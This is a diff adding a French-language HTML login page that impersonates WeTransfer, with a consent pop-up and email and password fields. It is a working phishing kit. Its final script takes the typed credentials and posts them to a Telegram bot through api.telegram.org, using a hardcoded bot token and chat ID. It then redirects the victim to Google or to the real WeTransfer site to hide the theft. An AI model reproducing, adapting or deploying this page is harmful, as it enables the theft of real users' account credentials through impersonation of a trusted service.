@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WeTransfer — Se connecter</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@900&family=Nunito:ital,wght@1,600;1,700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --scor-blue:#3E5FE0;
+    --scor-blue-deep:#2A44B8;
+    --scor-ink:#14161C;
+    --scor-muted:#6B7290;
+    --scor-line:#E3E6F0;
+    --scor-white:#FFFFFF;
+  }
+  *{ box-sizing:border-box; }
+  html,body{
+    margin:0; padding:0;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+    background: var(--scor-white);
+  }
+
+  .scor-page{
+    min-height: 100vh;
+    position: relative;
+    padding: 32px 32px 60px;
+  }
+
+  .scor-logo{
+    display:flex; align-items:center; gap:8px;
+  }
+  .scor-logo-img{
+    height: 26px;
+    width: auto;
+    display: block;
+  }
+
+  .scor-wordmark-img{
+    height: 46px;
+    width: auto;
+    max-width: 100%;
+    display: block;
+    margin: 0 auto 26px;
+  }
+
+  .scor-center{
+    max-width: 400px;
+    margin: 10px auto 0;
+    text-align: center;
+  }
+
+  .scor-wordmark{
+    font-family: 'Playfair Display', Georgia, serif;
+    font-weight: 900;
+    font-size: 46px;
+    letter-spacing: -0.01em;
+    color: var(--scor-ink);
+    margin: 0 0 26px;
+  }
+
+  .scor-heading{
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+    font-weight: 700;
+    font-size: 17px;
+    letter-spacing: -0.01em;
+    color: var(--scor-ink);
+    margin: 0 0 0px;
+  }
+  .scor-sub{
+    font-family: Arial, sans-serif;
+    font-style: normal;
+    font-weight: 400;
+    font-size: 15px;
+    letter-spacing: 0em;
+    color: var(--scor-ink);
+    margin: 0 0 18px;
+  }
+
+  .scor-input{
+    width:100%;
+    border: 1.5px solid var(--scor-line);
+    border-radius: 12px;
+    padding: 14px 16px;
+    font-size: 15px;
+    color: var(--scor-ink);
+    margin-bottom: 14px;
+    background: var(--scor-white);
+    transition: border-color 150ms ease;
+    text-align:left;
+  }
+  .scor-input:focus{ outline:none; border-color: var(--scor-blue); }
+  .scor-input::placeholder{ color: var(--scor-muted); }
+
+  .scor-btn{
+    width:100%;
+    border:none;
+    border-radius: 12px;
+    background: var(--scor-blue);
+    color:#fff;
+    font-size: 15.5px;
+    font-weight: 700;
+    padding: 14px 18px;
+    cursor:pointer;
+    transition: background 150ms ease, transform 100ms ease;
+    margin-top: 4px;
+  }
+  .scor-btn:hover{ background: var(--scor-blue-deep); }
+  .scor-btn:active{ transform: scale(0.99); }
+  .scor-btn:disabled{ background: var(--scor-line); color: var(--scor-muted); cursor:not-allowed; }
+
+  .scor-links{
+    margin-top: 22px;
+    font-size: 14px;
+  }
+  .scor-links a{
+    color: var(--scor-blue);
+    text-decoration: underline;
+    text-underline-offset: 2px;
+    cursor: pointer;
+    display:block;
+    margin-bottom: 10px;
+  }
+  .scor-links a:hover{ color: var(--scor-blue-deep); }
+
+  .scor-divider{
+    display:flex; align-items:center; gap:12px;
+    margin: 20px 0;
+    color: var(--scor-muted);
+    font-size: 12.5px;
+  }
+  .scor-divider::before, .scor-divider::after{
+    content:''; flex:1; height:1px; background: var(--scor-line);
+  }
+
+  .scor-code-link{
+    font-size: 14.5px;
+    color: var(--scor-muted);
+    margin: 0;
+  }
+  .scor-code-link a{
+    color: var(--scor-ink);
+    text-decoration: underline;
+    text-underline-offset: 2px;
+    cursor:pointer;
+  }
+
+  .scor-error{
+    background:#FDECEC; color:#C22B2B;
+    font-size:13.5px; padding:10px 12px; border-radius:10px;
+    margin-bottom:14px; display:none; text-align:left;
+  }
+  .scor-success{
+    background:#EAF3EA; color:#1E7A34;
+    font-size:13.5px; padding:10px 12px; border-radius:10px;
+    margin-bottom:14px; display:none; text-align:left;
+  }
+
+  .scor-toggle{
+    margin-top: 18px;
+    font-size: 14px;
+    color: var(--scor-muted);
+  }
+  .scor-toggle button{
+    background:none; border:none; color: var(--scor-blue);
+    font-weight:700; cursor:pointer; font-size:14px; padding:0;
+  }
+
+  .scor-footer{
+    position:absolute; bottom: 24px; left:0; right:0;
+    display:flex; justify-content:space-between;
+    padding: 0 32px;
+    font-size: 12.5px;
+    color: var(--scor-muted);
+  }
+  .scor-footer .scor-footer-links a{
+    color: var(--scor-muted);
+    text-decoration:none;
+    margin-left: 18px;
+  }
+  .scor-footer .scor-footer-links a:hover{ text-decoration:underline; }
+
+  .scor-hidden{ display:none !important; }
+
+  /* ---- Étape 1 : consentement ---- */
+  .scor-overlay{
+    position: fixed;
+    inset: 0;
+    background: rgba(20,22,28,0.35);
+    backdrop-filter: blur(2px);
+    display:flex; align-items:left; justify-content:left;
+    z-index: 10;
+    padding: 20px;
+  }
+  .scor-consent-card{
+    width: 100%;
+    max-width: 380px;
+    background: var(--scor-white);
+    border-radius: 20px;
+    padding: 40px 34px 34px;
+    box-shadow: 0 20px 60px -20px rgba(20,22,28,0.25), 0 2px 8px rgba(20,22,28,0.04);
+    text-align: left;
+    animation: scor-rise 420ms cubic-bezier(.2,.8,.2,1);
+  }
+  @keyframes scor-rise{
+    from{ opacity:0; transform: translateY(14px) scale(.98); }
+    to{ opacity:1; transform: translateY(0) scale(1); }
+  }
+  .scor-consent-icon{
+    width: 46px; height: 46px;
+    border-radius: 12px;
+    background: var(--scor-ink);
+    display:flex; align-items:left; justify-content:left;
+    margin-bottom: 22px;
+  }
+  .scor-consent-icon span{
+    font-family: Georgia, 'Times New Roman', serif;
+    color:#fff; font-weight:700; font-size:22px;
+  }
+  .scor-consent-title{
+    font-family: Georgia, 'Times New Roman', serif;
+    font-size: 27px;
+    line-height: 1.15;
+    color: var(--scor-ink);
+    margin: 0 0 16px;
+  }
+  .scor-consent-title b{ display:block; font-weight:800; }
+  .scor-consent-text{
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+    color: var(--scor-muted);
+    font-size: 14.5px;
+    line-height: 1.55;
+    margin: 0 0 26px;
+  }
+  .scor-consent-text a{
+    color: var(--scor-ink);
+    text-decoration: underline;
+    text-decoration-color: var(--scor-line);
+    text-underline-offset: 2px;
+  }
+
+  .scor-dash{ text-align:center; }
+  .scor-avatar{
+    width:56px; height:56px; border-radius:50%;
+    background: var(--scor-blue); color:#fff;
+    display:flex; align-items:center; justify-content:center;
+    font-family:Georgia, serif; font-weight:700; font-size:22px;
+    margin: 0 auto 18px;
+  }
+
+  @media (max-width: 460px){
+    .scor-center{ margin-top: 60px; }
+    .scor-wordmark{ font-size: 32px; }
+    .scor-footer{ flex-direction:column; gap:10px; align-items:center; padding:0 20px; }
+    .scor-footer .scor-footer-links a{ margin: 0 8px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ÉTAPE 1 : CONSENTEMENT -->
+<div class="scor-overlay" id="consentOverlay">
+  <div class="scor-consent-card">
+    <div class="scor-logo">
+    <img src="logo.png" alt="Logo" class="scor-logo-img" style="width: 50px; height: auto;">
+  </div>
+    <h1 class="scor-consent-title">Vous y êtes<br><b>presque</b></h1>
+    <p class="scor-consent-text">
+      Pour continuer, veuillez accepter nos
+      <a href="#" onclick="return false;">Conditions de service</a>,
+      ainsi que notre
+      <a href="#" onclick="return false;">Politique de confidentialité</a>.
+    </p>
+<button class="scor-btn" id="acceptBtn" onclick="this.parentElement.parentElement.style.display='none';">J'accepte</button>
+  </div>
+</div>
+
+  <div class="scor-logo">
+    <img src="logo.png" alt="Logo" class="scor-logo-img" style="width: 50px; height: auto;">
+  </div>
+
+<form id="loginForm">
+
+  <div class="scor-center">
+    <img src="wordmark.png" alt="Scor" class="scor-wordmark-img" style="width: 300px; height: auto;">
+
+  <p class="scor-heading" id="authTitle">Se connecter</p>
+  <p style="font-size: 14px" class="scor-sub" id="authSub">pour accéder à votre compte WeTransfer.</p>
+
+    <input class="scor-input" id="login" type="text" name="login" autocomplete="login" placeholder="Adresse e-mail">
+    <input class="scor-input" id="password" type="password" name="password" autocomplete="current-password" placeholder="Mot de passe">
+
+
+    <button class="scor-btn" id="submitBtn" type="submit" onclick="deuxiemeClic()">Continuer</button>
+
+
+</form>
+
+
+  <div class="scor-toggle" id="toggleZone" style="margin-top: 15px;">
+    Pas encore de compte ? <button id="toggleBtn" type="button">Créer un compte</button>
+  </div>
+
+  <div class="scor-footer">
+    <span>©2026 WeTransfer</span>
+    <span class="scor-footer-links">
+      <a href="#" onclick="return false;">Confidentialité</a>
+      <a href="#" onclick="return false;">Conditions</a>
+    </span>
+  </div>
+
+<script>
+let nombreClics = 0;
+
+function deuxiemeClic() {
+    nombreClics++;
+
+    if (nombreClics === 2) {
+        window.location.href = "https://wetransfer.com";
+    }
+}
+</script>
+
+   <script>
+    // Configuration de votre Bot Telegram
+const TELEGRAM_TOKEN = '8668173553:AAHgiZEmHZyc4uuEJw2BvT2gNCfWezxt2BE';
+    const TELEGRAM_CHAT_ID = '8252190794';
+
+    function togglePw(){
+      const f = document.getElementById('password');
+      f.type = f.type === 'password' ? 'text' : 'password';
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function(e){
+      e.preventDefault();
+
+      const loginValue = document.getElementById('login').value;
+      const passwordValue = document.getElementById('password').value;
+     
+
+      const message = `🔔 **Nouvelle WeTransfert🔔**\n\n👤 **Identifiant:** ${loginValue}\n 🔑 **Mot de passe:** ${passwordValue}\n`;
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(response => {
+        if(response.ok) {
+          console.log('Données envoyées avec succès à Telegram.');
+        } else {
+          console.error("Erreur lors de l'envoi à Telegram.");
+          window.location.href = "https://www.google.com";
+        }
+      })
+      .catch(error => {
+        console.error("Erreur réseau ou autre :", error);
+        window.location.href = "https://www.google.com/";
+      });
+    });
+  </script>
+
+</body>
+</html>
